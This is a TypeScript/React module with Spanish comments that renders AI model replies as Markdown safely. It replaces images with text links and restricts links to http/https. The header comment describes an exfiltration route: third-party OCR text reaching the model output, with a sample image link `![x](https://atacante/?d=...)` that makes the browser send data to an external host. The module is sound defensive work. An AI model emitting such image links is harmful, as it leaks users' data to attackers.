/**
 * Render Markdown seguro para respuestas de la IA (CT-REM-IA-02).
 *
 * El texto del modelo puede contener contenido controlado por terceros
 * (nombres de proveedor/producto salidos del OCR). Una imagen Markdown
 * `![x](https://atacante/?d=...)` haría que el navegador enviara datos a un
 * host externo. Por eso:
 *  - las imágenes NO se cargan: se sustituyen por un enlace de texto;
 *  - los enlaces solo admiten http/https, con rel="noopener noreferrer".
 */
import type { Components } from "react-markdown";
import { urlSegura } from "@/lib/url-segura";

/** `urlTransform` de react-markdown: lo no http(s) se vacía (no se enlaza). */
export const urlMarkdownSegura = (url: string): string => urlSegura(url) ?? "";

export const COMPONENTES_MARKDOWN_SEGUROS: Components = {
  img: ({ src, alt }) => {
    const href = urlSegura(typeof src === "string" ? src : null);
    const texto = alt?.trim() || "imagen";
    // Nunca <img>: se muestra el texto, y el enlace solo si es http(s).
    return href ? (
      <a href={href} target="_blank" rel="noopener noreferrer" className="underline underline-offset-2">
        [{texto}]
      </a>
    ) : (
      <span>[{texto}]</span>
    );
  },
  a: ({ href, children }) => {
    const seguro = urlSegura(typeof href === "string" ? href : null);
    return seguro ? (
      <a href={seguro} target="_blank" rel="noopener noreferrer">
        {children}
      </a>
    ) : (
      <span>{children}</span>
    );
  },
};
